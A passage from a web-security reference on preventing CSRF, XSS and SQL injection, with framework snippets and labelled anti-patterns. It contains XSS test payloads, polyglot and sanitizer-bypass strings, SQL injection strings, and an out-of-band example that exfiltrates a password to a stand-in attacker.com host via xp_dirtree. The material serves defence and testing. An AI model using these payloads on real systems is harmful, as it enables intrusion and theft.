    sess_id, token_action, timestamp = message.split(':')
    if sess_id != session_id or token_action != action:
        return False
    
    if int(time.time()) - int(timestamp) > max_age:
        return False
    
    return True
```

**Advantages**:

- Compromised token usable only for specific action
- Token leakage (logs, analytics) has limited impact
- Fine-grained audit trail of action-specific token usage

**Anti-patterns**:

- Action names predictable or enumerable (allows token generation)
- Single token valid for multiple sensitive actions
- No action validation, only token presence check
- Logging full tokens instead of hashed/truncated versions

### CSRF Protection in REST APIs

RESTful APIs typically use token-based authentication (JWT, OAuth) rather than cookies, fundamentally changing CSRF risk profile.

**Cookie-less authentication**:

- JWT in Authorization header: `Authorization: Bearer {token}`
- API keys in custom headers: `X-API-Key: {key}`
- Automatically attached credentials absent; CSRF risk eliminated

**Cookie-based API authentication**:

- APIs using session cookies remain vulnerable
- Apply standard CSRF protections (synchronizer tokens, double-submit)
- SameSite=Strict for API-only cookies (no cross-site API calls expected)

**CORS policy**:

- Restrict `Access-Control-Allow-Origin` to trusted domains
- Never use wildcard (`*`) with credentials (`Access-Control-Allow-Credentials: true`)
- Validate Origin header server-side even with CORS headers set

**Stateless token approach**:

- Client stores token in localStorage/sessionStorage
- Client manually attaches token to requests (not automatic like cookies)
- Immune to CSRF (attacker cannot access localStorage cross-origin)
- Vulnerable to XSS (attacker can read localStorage if XSS present)

**API design considerations**:

- Use POST/PUT/DELETE for state changes (never GET)
- Idempotency keys for preventing duplicate operations (separate from CSRF)
- Request signing (HMAC of request body + timestamp) for high-security APIs

**Anti-patterns**:

- Accepting credentials in URL parameters (logged, cached, bookmarked)
- CORS configuration allowing all origins with credentials
- Assuming REST APIs immune to CSRF without validating authentication mechanism
- Mixing cookie-based authentication with token-based on same API

### Framework-Specific Implementations

**Django**:

- Middleware: `django.middleware.csrf.CsrfViewMiddleware`
- Template tag: `{% csrf_token %}` injects hidden field
- AJAX: Read `csrftoken` cookie, send as `X-CSRFToken` header
- Decorator: `@csrf_exempt` to disable protection (use sparingly)
- Setting: `CSRF_COOKIE_HTTPONLY = False` (JavaScript needs read access)

**Spring Security**:

- Filter: `CsrfFilter` enabled by default
- Thymeleaf: `th:attr="csrf_token=${_csrf.token}"` template integration
- REST: Configure `CsrfTokenRepository` (cookie or session-based)
- Disable: `.csrf().disable()` (for stateless APIs only)

**ASP.NET Core**:

- Tag helper: `<form asp-antiforgery="true">` generates token field
- Attribute: `[ValidateAntiForgeryToken]` on controller actions
- AJAX: Include `RequestVerificationToken` in headers
- Configuration: `services.AddAntiforgery(options => { ... })`

**Express.js**:

- Middleware: `csurf` package (deprecated, use `csrf-csrf` or `@fastify/csrf-protection`)
- Token generation: `req.csrfToken()` method
- Cookie-based: Configure `cookie: true` option
- Error handling: Catch `EBADCSRFTOKEN` error, return 403

**Ruby on Rails**:

- Controller: `protect_from_forgery with: :exception` (default in ApplicationController)
- View helper: `<%= csrf_meta_tags %>` generates meta tags
- AJAX: Reads meta tag, includes in `X-CSRF-Token` header (handled by rails-ujs)
- Disable: `skip_before_action :verify_authenticity_token` (avoid)

### Multi-Page Application (MPA) Patterns

**Server-rendered forms**:

- Generate token during form rendering on server
- Inject as hidden field via template engine
- Submit with form data
- Validate server-side before processing

**Progressive enhancement**:

- Forms work without JavaScript (traditional POST)
- JavaScript intercepts submission, adds token header for Ajax
- Fallback to hidden field if JavaScript disabled

**Token refresh**:

- Long-lived pages may experience token expiration
- Implement token refresh endpoint returning new token
- Periodically refresh token via background Ajax call
- Update hidden fields and meta tags with new token

### Single-Page Application (SPA) Patterns

**Initial token acquisition**:

- Server embeds token in initial HTML (meta tag, inline script)
- SPA reads token on bootstrap
- Stores in memory (module variable, React context, Vuex store)

**Token inclusion**:

- HTTP interceptor (Axios, Fetch wrapper) automatically attaches token
- Framework integration: React hooks, Angular HTTP interceptors, Vue plugins

**Token rotation**:

- Receive new token in response headers or body after mutations
- Update stored token automatically
- Handle token expiration gracefully (refresh or re-authenticate)

**Example (React + Axios)**:

```javascript
// Bootstrap
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// Axios interceptor
axios.interceptors.request.use(config => {
  config.headers['X-CSRF-Token'] = csrfToken;
  return config;
});

// Handle token rotation
axios.interceptors.response.use(response => {
  const newToken = response.headers['x-csrf-token'];
  if (newToken) {
    csrfToken = newToken;
    document.querySelector('meta[name="csrf-token"]').content = newToken;
  }
  return response;
});
```

### Mobile Application Considerations

**Native app authentication**:

- Mobile apps typically use OAuth tokens (JWT), not cookies
- Tokens stored in secure storage (iOS Keychain, Android Keystore)
- CSRF risk negligible (no automatic credential attachment)

**Embedded WebViews**:

- WebViews loading external content may inherit app cookies
- CSRF vulnerable if WebView allows arbitrary navigation
- Mitigation: Disable cookie sharing, validate navigation targets, implement CSP

**Hybrid apps (React Native, Flutter)**:

- HTTP clients don't automatically attach cookies
- Use token-based authentication stored in secure storage
- Custom HTTP client configuration for cookie handling if required

### Testing CSRF Protections

**Manual testing**:

1. Capture legitimate request with valid CSRF token
2. Remove or modify token value
3. Replay request; expect 403/400 response
4. Replay with token from different session; expect rejection
5. Replay expired token; expect rejection
6. Test cross-origin submission via crafted HTML page

**Automated testing**:

- Unit tests: Mock requests with missing/invalid tokens, verify rejection
- Integration tests: Submit forms without tokens, verify error responses
- End-to-end tests: Browser automation (Selenium, Playwright) submitting forms

**Penetration testing**:

- CSRF PoC generators (Burp Suite, OWASP ZAP)
- Test GET-based state changes (password reset, account deletion)
- Test JSON endpoints (Content-Type: application/json bypass attempts)
- Test Flash/PDF-based CSRF (mostly historical)
- Test CORS misconfiguration enabling CSRF

**Security scanning**:

- Static analysis: Detect missing CSRF protection on state-changing endpoints
- Dynamic analysis: Crawler identifies forms without CSRF tokens
- Regression testing: Automated CSRF checks in CI/CD pipeline

### Defense-in-Depth Strategy

Layered protections compensate for individual mechanism failures.

**Primary defense**: Synchronizer tokens or double-submit cookies **Secondary defense**: SameSite cookie attribute **Tertiary defense**: Origin/Referer validation **Additional layers**: Custom headers for AJAX, Content-Type validation, CAPTCHA for sensitive operations

**Configuration example**:

```
Session cookie: SameSite=Lax; Secure; HttpOnly
CSRF cookie: SameSite=Lax; Secure; HttpOnly=False
Synchronizer token: Per-session, 256-bit random
Origin validation: Enforce on all state-changing requests
Custom header: Required for AJAX endpoints
```

### Performance Considerations

**Token generation overhead**: CSPRNG calls expensive. Batch-generate tokens, pool for reuse. Typical cost: 50-200μs per token.

**Validation overhead**: HMAC verification ~10-50μs. Session lookup 1-5ms (database) or 0.1-1ms (Redis). Use in-memory caching for hot sessions.

**Token storage**: Per-session tokens ~32 bytes. Per-request pools ~3-10KB per session. Monitor memory usage on high-concurrency systems.

**Network overhead**: Token transmission adds 40-60 bytes per request (Base64-encoded 32-byte token). Negligible for typical requests.

**Caching implications**: Cannot cache responses containing CSRF tokens (Vary: Cookie header). Use token-less cached pages, inject tokens client-side.

### Compliance and Standards

**OWASP Top 10**: CSRF listed as A01:2021 – Broken Access Control (historically separate A8:2013).

**PCI DSS**: Requirement 6.5.9 mandates CSRF protection for payment card processing applications.

**NIST**: Special Publication 800-63B recommends CSRF protection for authenticated sessions.

**ISO 27001**: A.14.2.5 requires secure development practices including CSRF mitigation.

### Anti-patterns Summary

- GET requests performing state changes (violates HTTP semantics, enables CSRF)
- No CSRF protection on "read-only" endpoints modifying server state (logout, preference changes)
- Token validation only on initial page load, not subsequent actions
- Storing CSRF tokens in localStorage then including in cookies (defeats protection)
- Using session ID as CSRF token (tokens must be independent of session identifiers)
- Accepting CSRF token from URL parameters (leakage via Referer header)
- Framework CSRF protection disabled without alternative mitigation
- No CSRF protection for webhooks/callbacks (requires HMAC verification instead)
- Same CSRF token shared across multiple tenants/users
- CSRF tokens in client-side error messages or logs
- No rate limiting on failed CSRF validation attempts (enables brute force)
- Treating 4xx errors as validation success due to misconfigured error handling

**Related topics**: XSS prevention (CSRF bypass vector), CORS security headers, content security policy (CSP), session management best practices, secure cookie configuration, clickjacking prevention (X-Frame-Options, CSP frame-ancestors), authentication token security, subdomain isolation strategies, DNS rebinding attack mitigation.

---

## XSS Prevention

Cross-Site Scripting (XSS) enables attackers to inject malicious scripts into web applications, executing arbitrary JavaScript in victim browsers. Prevention requires defense-in-depth across input handling, output encoding, and security controls. Single-layer protection is insufficient; layered mitigations address bypass techniques and implementation errors.

### XSS Types and Attack Vectors

**Reflected XSS**: Malicious input immediately reflected in response. Commonly exploited through URL parameters, form inputs, HTTP headers. Requires social engineering to deliver malicious link.

**Stored XSS**: Malicious payload persisted in database, served to multiple users. Higher impact; no per-victim social engineering required. Common in user-generated content (comments, profiles, messages).

**DOM-based XSS**: Vulnerability exists in client-side JavaScript manipulating DOM. Payload never reaches server; purely client-side exploitation. Traditional server-side protections ineffective.

**Mutation XSS (mXSS)**: Browser HTML parser transforms seemingly safe input into executable code during parsing. Bypasses sanitizers operating on string representations.

**Self-XSS**: Requires victim to manually execute malicious code (paste into console, edit DOM). Not typically considered vulnerability unless combinable with social engineering at scale.

```javascript
// Reflected XSS example
// URL: /search?q=<script>alert(document.cookie)</script>
app.get('/search', (req, res) => {
    // Anti-pattern: Direct interpolation
    res.send(`<h1>Results for: ${req.query.q}</h1>`);
    // Renders: <h1>Results for: <script>alert(document.cookie)</script></h1>
});

// DOM-based XSS example
// Anti-pattern: Unsafe DOM manipulation
const query = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = query;
```

### Context-Aware Output Encoding

Output encoding must match injection context. Universal encoding functions fail across contexts.

**HTML Context**: Encode `<`, `>`, `&`, `"`, `'` as entities. Prevents tag injection and attribute breaking.

```javascript
// HTML context encoding
function encodeHTML(str) {
    return str.replace(/[<>&"']/g, char => {
        const entities = {
            '<': '&lt;',
            '>': '&gt;',
            '&': '&amp;',
            '"': '&quot;',
            "'": '&#x27;'
        };
        return entities[char];
    });
}

// Safe usage
res.send(`<h1>Results for: ${encodeHTML(userInput)}</h1>`);
```

**HTML Attribute Context**: Requires attribute value quoting and context-specific encoding. Unquoted attributes vulnerable to space-based injection.

```html
<!-- Anti-pattern: Unquoted attribute -->
<div class=${userInput}>Content</div>
<!-- Payload: onclick=alert(1) results in: <div class=onclick=alert(1)>Content</div> -->

<!-- Correct: Quoted attribute with encoding -->
<div class="${encodeHTMLAttr(userInput)}">Content</div>
```

**JavaScript Context**: JSON encoding alone insufficient. Requires HTML entity encoding for string literals in inline scripts and careful context handling.

```javascript
// Anti-pattern: Direct interpolation in script context
res.send(`<script>var data = "${userInput}";</script>`);
// Payload: "; alert(1); " results in: var data = ""; alert(1); "";

// Correct: JSON encoding + HTML encoding
const escaped = JSON.stringify(userInput).replace(/</g, '\\u003c').replace(/>/g, '\\u003e');
res.send(`<script>var data = ${escaped};</script>`);
```

**URL Context**: URL-encode special characters. Validate protocol to prevent `javascript:` URLs.

```javascript
// Anti-pattern: Direct URL construction
const url = `https://example.com/search?q=${userInput}`;

// Correct: URL encoding with protocol validation
function encodeURL(str) {
    return encodeURIComponent(str);
}

function isSafeURL(url) {
    try {
        const parsed = new URL(url);
        return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
    } catch {
        return false;
    }
}
```

**CSS Context**: Avoid user input in CSS entirely. If unavoidable, strict allowlist validation (hex colors, numeric values). CSS expression injection and `url()` directive attacks bypass naive encoding.

```javascript
// Anti-pattern: User input in inline style
<div style="color: ${userInput}">Text</div>
// Payload: red; background: url('javascript:alert(1)')

// Correct: Allowlist validation
function validateColor(color) {
    return /^#[0-9A-Fa-f]{6}$/.test(color) ? color : '#000000';
}
```

### Content Security Policy (CSP)

CSP instructs browsers to restrict resource loading and script execution. Defense-in-depth control; mitigates XSS impact even when injection occurs.

**Directive types**:

- `default-src`: Fallback for unspecified directives
- `script-src`: Controls JavaScript execution sources
- `style-src`: Controls CSS loading
- `img-src`, `font-src`, `connect-src`: Media and connection sources
- `frame-ancestors`: Controls embedding (clickjacking protection)
- `base-uri`: Restricts `<base>` tag targets

**Unsafe configurations**:

```http
# Anti-pattern: Overly permissive CSP
Content-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval';

# Anti-pattern: Allowlist bypass via JSONP endpoints
Content-Security-Policy: script-src https://trusted-cdn.com;
# Attacker: <script src="https://trusted-cdn.com/jsonp?callback=alert(document.cookie)"></script>
```

**Strict CSP with nonces**:

```javascript
// Generate cryptographically random nonce per response
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');

res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none';`
);

// All inline scripts require matching nonce
res.send(`
    <script nonce="${nonce}">
        // Safe inline script
    </script>
`);
```

**Strict CSP with hashes**:

```javascript
// Hash-based CSP for static scripts
const scriptContent = "console.log('hello');";
const hash = crypto.createHash('sha256').update(scriptContent).digest('base64');

res.setHeader(
    'Content-Security-Policy',
    `script-src 'sha256-${hash}'`
);
```

**CSP reporting**:

```http
Content-Security-Policy: default-src 'self'; report-uri /csp-violation-report
Content-Security-Policy-Report-Only: script-src 'nonce-abc123'; report-uri /csp-test-report
```

```javascript
// CSP violation reporting endpoint
app.post('/csp-violation-report', express.json(), (req, res) => {
    const violation = req.body['csp-report'];
    logger.warn('CSP violation', {
        documentUri: violation['document-uri'],
        violatedDirective: violation['violated-directive'],
        blockedUri: violation['blocked-uri'],
        sourceFile: violation['source-file'],
        lineNumber: violation['line-number']
    });
    res.status(204).end();
});
```

### Template Engines and Auto-Escaping

Modern template engines provide automatic context-aware escaping. Requires correct configuration and understanding of escape mechanisms.

**React/JSX**: Automatically escapes values in JSX expressions. `dangerouslySetInnerHTML` bypasses protection.

```javascript
// Safe: Automatic escaping
const UserGreeting = ({ name }) => <div>Hello, {name}</div>;

// Anti-pattern: Bypassing protection
const UnsafeComponent = ({ html }) => (
    <div dangerouslySetInnerHTML={{ __html: html }} />
);

// Correct: Sanitize before using dangerouslySetInnerHTML
import DOMPurify from 'dompurify';
const SafeComponent = ({ html }) => (
    <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
);
```

**Vue.js**: `{{ }}` interpolation auto-escapes. `v-html` directive bypasses protection.

```vue
<!-- Safe: Auto-escaped -->
<template>
  <div>{{ userInput }}</div>
</template>

<!-- Anti-pattern: Unsafe HTML rendering -->
<template>
  <div v-html="userInput"></div>
</template>

<!-- Correct: Sanitize before v-html -->
<template>
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'dompurify';
export default {
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.userInput);
    }
  }
};
</script>
```

**Template engine escape bypasses**:

```javascript
// Anti-pattern: Raw filter in Jinja2/Twig
{{ userInput|raw }}  // Disables auto-escaping

// Anti-pattern: Safe filter in Django
{{ userInput|safe }}  // Marks string as safe HTML

// Anti-pattern: Unescaped helper in Handlebars
{{{ userInput }}}  // Triple braces disable escaping
```

### HTML Sanitization

Sanitization allows safe HTML subset. Required for rich text editors, markdown rendering, user-generated HTML content.

**Allowlist approach**: Define permitted tags and attributes. Reject everything else.

```javascript
// DOMPurify configuration
import DOMPurify from 'dompurify';

const cleanHTML = DOMPurify.sanitize(dirtyHTML, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
    ALLOWED_URI_REGEXP: /^https?:\/\//  // Only http(s) links
});
```

**Sanitization challenges**:

**Mutation XSS (mXSS)**: Browser parser transforms sanitized HTML into executable code.

```javascript
// mXSS example
const input = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
// After sanitization: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
// Browser parsing: Closes noscript early, img tag executes
```

**DOMPurify** handles mXSS through parse-serialize-parse cycles. Lesser sanitizers vulnerable.

**Context confusion**: Sanitizing for HTML context then using in JavaScript context.

```javascript
// Anti-pattern: HTML-sanitized data in JS context
const sanitized = DOMPurify.sanitize(userInput);
document.write(`<script>var data = "${sanitized}";</script>`);
// Still vulnerable to context-specific attacks
```

**Configuration vulnerabilities**:

```javascript
// Anti-pattern: Over-permissive configuration
DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['*'],  // Allows all tags
    ALLOWED_ATTR: ['*']   // Allows all attributes
});

// Anti-pattern: Allowing javascript: URLs
DOMPurify.sanitize(html, {
    ALLOWED_URI_REGEXP: /.*/  // Permits javascript: protocol
});
```

**Custom sanitization pitfalls**:

```javascript
// Anti-pattern: Regex-based sanitization
function badSanitize(html) {
    return html.replace(/<script.*?<\/script>/gi, '');
}
// Bypassed by: <scr<script>ipt>alert(1)</scr<script>ipt>
// Bypassed by: <img src=x onerror=alert(1)>

// Anti-pattern: Blocklist approach
function badSanitize(html) {
    const blocked = ['script', 'iframe', 'object', 'embed'];
    blocked.forEach(tag => {
        html = html.replace(new RegExp(`<${tag}`, 'gi'), '');
    });
    return html;
}
// Incomplete coverage; easy to bypass
```

### DOM-Based XSS Prevention

Client-side JavaScript vulnerabilities from unsafe DOM manipulation.

**Dangerous sinks**:

- `innerHTML`, `outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
- `element.setAttribute()` for event handlers
- `location` manipulation

```javascript
// Anti-pattern: Unsafe DOM manipulation
const searchQuery = new URLSearchParams(location.search).get('q');
document.getElementById('results').innerHTML = `<h1>${searchQuery}</h1>`;

// Correct: Use textContent for text insertion
document.getElementById('results').textContent = searchQuery;

// Correct: Use DOM APIs for structured content
const heading = document.createElement('h1');
heading.textContent = searchQuery;
document.getElementById('results').appendChild(heading);
```

**Location manipulation vulnerabilities**:

```javascript
// Anti-pattern: Unsafe redirect
const redirectUrl = new URLSearchParams(location.search).get('next');
window.location = redirectUrl;  // Vulnerable to javascript: URLs

// Correct: URL validation
function safeRedirect(url) {
    try {
        const parsed = new URL(url, window.location.origin);
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            throw new Error('Invalid protocol');
        }
        if (parsed.origin !== window.location.origin) {
            throw new Error('External redirect not allowed');
        }
        window.location = parsed.href;
    } catch (e) {
        console.error('Invalid redirect URL', e);
        window.location = '/';
    }
}
```

**Event handler injection**:

```javascript
// Anti-pattern: User-controlled event handlers
const color = getUserInput();
element.setAttribute('onclick', `changeColor('${color}')`);

// Correct: Use addEventListener
element.addEventListener('click', () => {
    changeColor(color);
});
```

**Template literal injection**:

```javascript
// Anti-pattern: User input in template literals
const html = `<div>${userInput}</div>`;
element.innerHTML = html;  // No automatic escaping in template literals

// Correct: Explicit encoding
const html = `<div>${encodeHTML(userInput)}</div>`;
```

### Framework-Specific Patterns

**Angular**: Sanitizes by default. `bypassSecurityTrust*` methods disable protection.

```typescript
// Anti-pattern: Bypassing Angular sanitization
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

getTrustedHtml(html: string) {
    return this.sanitizer.bypassSecurityTrustHtml(html);  // Dangerous
}

// Correct: Let Angular sanitize or use explicit sanitization
import DOMPurify from 'dompurify';

getSafeHtml(html: string) {
    const clean = DOMPurify.sanitize(html);
    return this.sanitizer.bypassSecurityTrustHtml(clean);
}
```

**Next.js/React**: `dangerouslySetInnerHTML` requires explicit sanitization.

```javascript
// Pattern: Safe HTML rendering in Next.js
import DOMPurify from 'isomorphic-dompurify';

export default function SafeContent({ htmlContent }) {
    const sanitized = DOMPurify.sanitize(htmlContent, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
        ALLOWED_ATTR: ['href']
    });
    
    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

**Server-Side Rendering (SSR) considerations**: Sanitize on server to prevent hydration mismatches and reduce client-side attack surface.

### Input Validation

Validation complements output encoding. **Defense-in-depth principle**: Validate inputs AND encode outputs.

**Allowlist validation**: Define expected format; reject deviations.

```javascript
// Pattern: Strict input validation
function validateUsername(username) {
    // Allow only alphanumeric and underscore
    if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
        throw new ValidationError('Invalid username format');
    }
    return username;
}

function validateEmail(email) {
    // Basic email validation
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!emailRegex.test(email)) {
        throw new ValidationError('Invalid email format');
    }
    return email;
}
```

**Type coercion vulnerabilities**:

```javascript
// Anti-pattern: Loose comparison allows type confusion
function isAdmin(userId) {
    return userId == ADMIN_USER_ID;  // "123" == 123 returns true
}

// Correct: Strict comparison and type validation
function isAdmin(userId) {
    if (typeof userId !== 'number') {
        throw new TypeError('userId must be number');
    }
    return userId === ADMIN_USER_ID;
}
```

**Length limitations**: Prevent large payloads exhausting sanitization resources.

```javascript
// Pattern: Input length validation
const MAX_INPUT_LENGTH = 10000;

function validateInput(input) {
    if (typeof input !== 'string') {
        throw new TypeError('Input must be string');
    }
    
    if (input.length > MAX_INPUT_LENGTH) {
        throw new ValidationError(`Input exceeds maximum length of ${MAX_INPUT_LENGTH}`);
    }
    
    return input;
}
```

### HTTPOnly and Secure Cookies

Cookies with `HttpOnly` flag inaccessible to JavaScript. Mitigates XSS-based session theft.

```javascript
// Pattern: Secure cookie configuration
res.cookie('sessionId', sessionToken, {
    httpOnly: true,      // Prevents JavaScript access
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000,     // 1 hour
    domain: '.example.com',
    path: '/'
});
```

**Limitations**: XSS can still perform actions as authenticated user. HTTPOnly prevents token exfiltration but not CSRF-like attacks within same origin.

### Subresource Integrity (SRI)

Validates integrity of external resources (CDN scripts, stylesheets). Prevents compromised CDN from injecting malicious code.

```html
<!-- Pattern: SRI for external scripts -->
<script 
    src="https://cdn.example.com/library.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux9C6p7V7vE8PzX3fV3K6t8C7rX5JxL"
    crossorigin="anonymous">
</script>

<link 
    rel="stylesheet"
    href="https://cdn.example.com/styles.css"
    integrity="sha384-..."
    crossorigin="anonymous">
```

**SRI hash generation**:

```bash
# Generate SRI hash
openssl dgst -sha384 -binary library.js | openssl base64 -A
```

```javascript
// Generate SRI hash in Node.js
const crypto = require('crypto');
const fs = require('fs');

function generateSRI(filePath, algorithm = 'sha384') {
    const content = fs.readFileSync(filePath);
    const hash = crypto.createHash(algorithm).update(content).digest('base64');
    return `${algorithm}-${hash}`;
}
```

### Trusted Types API

Browser API enforcing type safety for dangerous sinks. Requires explicit policy creation for DOM manipulation.

```javascript
// Pattern: Trusted Types policy
if (window.trustedTypes && trustedTypes.createPolicy) {
    const escapePolicy = trustedTypes.createPolicy('escape', {
        createHTML: (string) => {
            return DOMPurify.sanitize(string, {
                RETURN_TRUSTED_TYPE: true
            });
        },
        createScriptURL: (string) => {
            // Validate script URL
            const url = new URL(string, document.baseURI);
            if (!ALLOWED_SCRIPT_ORIGINS.includes(url.origin)) {
                throw new TypeError('Invalid script origin');
            }
            return string;
        }
    });
    
    // Use policy for innerHTML
    element.innerHTML = escapePolicy.createHTML(userInput);
}
```

**CSP integration**:

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types escape default
```

### Anti-Patterns

**Encoding functions in wrong context**: Using HTML encoding for JavaScript context or vice versa.

**Double encoding**: Encoding data multiple times creates encoding artifacts that may bypass filters or display incorrectly.

```javascript
// Anti-pattern: Double encoding
const encoded = encodeHTML(encodeHTML(userInput));
// "hello" -> "&amp;lt;script&amp;gt;" instead of "&lt;script&gt;"
```

**Blacklist filtering**: Attempting to remove dangerous patterns rather than allowlisting safe patterns.

```javascript
// Anti-pattern: Blacklist approach
function badFilter(input) {
    return input
        .replace(/<script/gi, '')
        .replace(/javascript:/gi, '')
        .replace(/onerror/gi, '');
}
// Easily bypassed: <scr<script>ipt>, java&#x09;script:, on error
```

**Client-side validation only**: Relying solely on JavaScript validation. Trivially bypassed by modifying requests or disabling JavaScript.

**Trusting user-agent headers**: Basing security decisions on `User-Agent`, `Referer`, or other client-controlled headers.

**Incomplete output encoding**: Encoding some user inputs but missing others in same response.

**Disabling framework protections**: Using `unsafe` methods or disabling auto-escaping without proper sanitization.

**Magic quotes/addslashes**: Legacy PHP approaches inadequate for XSS prevention. Context-specific encoding required.

```php
// Anti-pattern: Magic quotes (deprecated)
$escaped = addslashes($userInput);
echo "<div>$escaped</div>";  // Still vulnerable

// Correct: Context-aware encoding
echo "<div>" . htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8') . "</div>";
```

### Testing and Detection

**Static analysis**: Scan codebases for dangerous patterns (unsanitized sinks, disabled protections).

```javascript
// ESLint rules for XSS prevention
{
  "rules": {
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error",
    "react/no-danger": "warn"
  }
}
```

**Dynamic testing**: Automated scanning with XSS payloads. Tools: Burp Suite, OWASP ZAP, XSStrike.

**Payload examples for testing**:

```javascript
// Basic XSS payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Event handler variations
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

// Context-specific payloads
';alert(1);//  (JavaScript context)
javascript:alert(1)  (URL context)
</style><script>alert(1)</script>  (CSS context escape)

// Encoding bypasses
<img src=x on error=alert(1)>  (space in attribute)
<img src=x onerror="alert(1)"autofocus>  (missing space)
<svg><script>alert(1)</script>  (HTML5 tags)

// Mutation XSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot payloads (multiple contexts)
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
```

**Browser DevTools detection**: Monitor console for CSP violations, Trusted Types violations.

**Penetration testing**: Manual testing with context-aware payloads targeting specific application logic.

### Defense-in-Depth Strategy

Layered approach required; single control insufficient:

1. **Input validation**: Reject malformed input early
2. **Output encoding**: Context-aware encoding at rendering
3. **CSP**: Restrict script execution sources
4. **HTTPOnly cookies**: Prevent JavaScript cookie access
5. **SRI**: Validate external resource integrity
6. **Framework protections**: Use auto-escaping templates correctly
7. **Security headers**: `X-Content-Type-Options`, `X-Frame-Options`
8. **Regular security audits**: Code review, penetration testing
9. **Developer training**: Security-aware coding practices

Related topics: Content Security Policy bypass techniques, DOM Clobbering, prototype pollution, CSS injection attacks, JSON hijacking, clickjacking prevention, CORS misconfiguration.

---

## SQL Injection Prevention

### Attack Mechanics and Exploitation Vectors

SQL injection occurs when untrusted data concatenates directly into SQL queries, allowing attackers to manipulate query structure. Attacker-controlled input breaks out of intended data context, injects arbitrary SQL commands. Classic example: `SELECT * FROM users WHERE username = '" + input + "'"` with input `admin' OR '1'='1` produces `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`, bypassing authentication by making WHERE clause always true.

**Exploitation Taxonomy:**

**In-Band SQLi:** Results returned directly in application response. Union-based attacks append `UNION SELECT` to extract data from other tables. Error-based attacks trigger verbose database errors revealing schema information, table names, column types.

**Blind SQLi:** No direct data return, attacker infers information through application behavior. Boolean-based: crafting queries causing different responses (true/false conditions). Time-based: injecting sleep/delay commands (`'; WAITFOR DELAY '00:00:05'--` on SQL Server), measuring response time to confirm vulnerability and extract data bit-by-bit.

**Out-of-Band SQLi:** Data exfiltration through alternate channels. Attacker triggers DNS lookups, HTTP requests, or file writes containing extracted data. Example: `'; EXEC xp_dirtree '\\attacker.com\' + (SELECT password FROM users WHERE id=1) + '.attacker.com\share'--` leaks password via DNS query. Requires database permissions for network operations.

### Parameterized Queries (Prepared Statements)

Fundamental defense mechanism. Query structure defined separately from data values. Database driver transmits SQL template and parameters independently—database engine never interprets parameters as SQL syntax.

**Implementation Requirements:**

**True Parameterization:** Parameter placeholders (`?`, `:name`, `@param`) embedded in query string. Values passed through separate API calls. Database parses query structure once, executes with multiple parameter sets without re-parsing. Prevents all injection attacks targeting data values.

**Incorrect Parameterization:** String concatenation masquerading as parameterization:

```python
# VULNERABLE - string formatting
cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)

# SECURE - actual parameterization  
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

First example performs string substitution before query execution—identical to direct concatenation. Second example passes parameter separately to database driver.

**Language-Specific Patterns:**

**Java (JDBC):**

```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND status = ?");
stmt.setString(1, username);
stmt.setString(2, status);
ResultSet rs = stmt.executeQuery();
```

`setString()`, `setInt()`, `setDate()` methods perform type-safe parameter binding. Never use `Statement.execute()` with concatenated strings.

**Python (psycopg2, MySQL Connector):**

```python
cursor.execute("SELECT * FROM orders WHERE user_id = %s AND date > %s", (user_id, start_date))
```

Placeholder syntax varies by driver (`%s` for psycopg2, `?` for sqlite3). Always pass parameters as tuple/list in second argument.

**C# (ADO.NET):**

```csharp
SqlCommand cmd = new SqlCommand("SELECT * FROM products WHERE category = @category AND price < @maxPrice", conn);
cmd.Parameters.AddWithValue("@category", category);
cmd.Parameters.AddWithValue("@maxPrice", maxPrice);
```

Named parameters with `@` prefix. `AddWithValue()` infers type; explicit `Add()` with `SqlDbType` provides type safety.

**PHP (PDO):**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $email]);
```

Named (`:name`) or positional (`?`) placeholders. `prepare()` separates structure from data. Never use `query()` with concatenated user input.

**Node.js (MySQL2, pg):**

```javascript
connection.execute('SELECT * FROM users WHERE username = ? AND active = ?', [username, active], (err, results) => {});
```

